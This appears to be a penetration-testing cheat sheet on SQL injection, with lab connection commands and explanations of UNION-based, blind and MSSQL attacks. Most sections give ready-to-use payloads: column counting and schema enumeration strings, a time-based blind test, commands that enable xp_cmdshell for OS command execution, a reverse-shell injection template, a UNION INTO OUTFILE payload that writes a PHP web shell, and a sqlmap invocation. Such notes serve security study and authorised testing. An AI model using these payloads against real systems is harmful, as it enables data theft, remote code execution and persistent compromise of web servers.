# SQL Injection
SQL Injections are the most common form of injections because SQL databases are very popular in dynamic web applications. This vulnerability allows an attacker to tamper existing SQL queries performed by the web application. Depending on the queries, the attacker might be able to access, modify or even destroy data from the database. Since databases are commonly used to store private data, such as authentication information, personal user data and site content, if an attacker gains access to it, the consequences are typically very severe, ranging from defacement of the web application to users data leakage or loss, or even full control of the web application or database server.

# DB Types and Characteristics
```bash
# MySQL
mysql -u root -p'root' -h 192.168.50.16 -P 3306 --skip-ssl-verify-server-cert

# MSSQL
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
```
# UNION-based Payloads
When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the UNION keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.
```SQL
# Determine the number of columns
' ORDER BY 1-- //
%' UNION SELECT 'a1', 'a2', 'a3', 'a4', 'a5' -- //

# Enumeration
%' UNION SELECT database(), user(), @@version, null, null -- //
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //
```
# Blind SQL Injection
Blind SQL (Structured Query Language) injection is a type of SQL Injection attack that asks the database true or false questions and determines the answer based on the applications response. This attack is often used when the web application is configured to show generic error messages, but has not mitigated the code that is vulnerable to SQL injection. When an attacker exploits SQL injection, sometimes the web application displays error messages from the database complaining that the SQL Query’s syntax is incorrect. Blind SQL injection is nearly identical to normal SQL Injection, the only difference being the way the data is retrieved from the database. When the database does not output data to the web page, an attacker is forced to steal data by asking the database a series of true or false questions. This makes exploiting the SQL Injection vulnerability more difficult, but not impossible.

This is a SQL Injection cheat sheet for testing:  [Cheatsheet](https://github.com/payloadbox/sql-injection-payload-list)

```SQL
# Test for blind SQLi
' AND IF (1=1, sleep(3),'false') -- //
```

# MSSQL Code Execution
In MSSQL thanks to the keyword execute, we can execute arbitrary command on the operating system below. To do that first we have to enable command execution inside the Database with

```sql
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

Then execute commands with

```sql
EXECUTE xp_cmdshell 'whoami'
```

Putting all togheter, we can have very fancy injections adding multiple tools.
## Blind Reverse Shell

The following payload has been crafted with [RevShells](https://www.revshells.com/)

```sql
'; EXECUTE xp_cmdshell '<CRAFTED POWERSHELL BASE64 PAYLOAD USING REVSHELL>'; --
```

# Uploading PHP Backdoor with UNION
In other database scenarios we can abuse the `SELECT INTO_OUTFILE` statement and we can try to upload something malicious in the webserver. We must have write permission in the folder we will write the file into.

```sql
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- //
```

Next, with a simple GET request like `/tmp/cmd=whoami` we can execute commands on the webserver.

# sqlmap
Finally, we can use something that automates the SQL exploits, like **sqlmap**. With this tool we can have automatic scan and checks for any type of vulnerability on the webserver using SQL and It can also automatically upload **reverse shells** to the server. For more information check directly the project documentation [SQL-Map Documentation](https://github.com/sqlmapproject/sqlmap). A basic usage of sqlmap could be the following code

```shell
sqlmap -u 'http://<target>/page.php?user=test' -p user
```
